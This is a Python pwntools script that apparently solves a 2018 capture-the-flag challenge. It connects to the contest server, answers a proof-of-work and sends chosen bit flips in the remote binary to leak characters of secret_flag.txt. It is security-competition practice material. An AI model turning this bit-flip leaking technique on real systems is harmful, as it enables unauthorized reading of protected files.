from pwn import *
from pow import solve_pow
import time
import sys
import random
import collections
import re

# context.log_level = 'debug'

chars = collections.OrderedDict()

def flip(i, j):
    r = remote("61421a06.quals2018.oooverflow.io", 5566)

    out = r.recvuntil('Solution:')
    chal = re.findall(r'Challenge: (.*?)\n', out)[0]
    n = int(re.findall(r'n: (.*?)\n', out)[0])

    ans = solve_pow(chal, n)
    r.sendline(str(ans))

    ans = "\n"

    offset = (0xff ^ (1 << i))
    if j is not None:
        offset ^= (1 << j)

    flips = [
            (0xDAE, 2),
            (0xFCE + 1, 6), # check
            (0xD05 + 3, i)
    ]

    if j is not None:
        flips.append((0xD05 + 3, j))

    r.sendline(str(len(flips)))

    for x, y in flips:
        r.sendline("%d" % (x * 8 + y))

    m = r.readall()
    found = (re.findall(r"\[([-\d]*)msecret_flag.txt", m))
    if not found:
        return
    found = int(found[0]) + 0x30 - 30

    try:
        chars[offset] = chr(found)
        print("%d: %s" % (offset, chr(found)))
        for k in sorted(chars.keys()):
            v = chars[k]
            print("%d: %s" % (k, v))
    except ValueError:
        pass

    r.close()

for i in xrange(8):
    for j in [None] + range(i + 1, 8):
        flip(i, j)
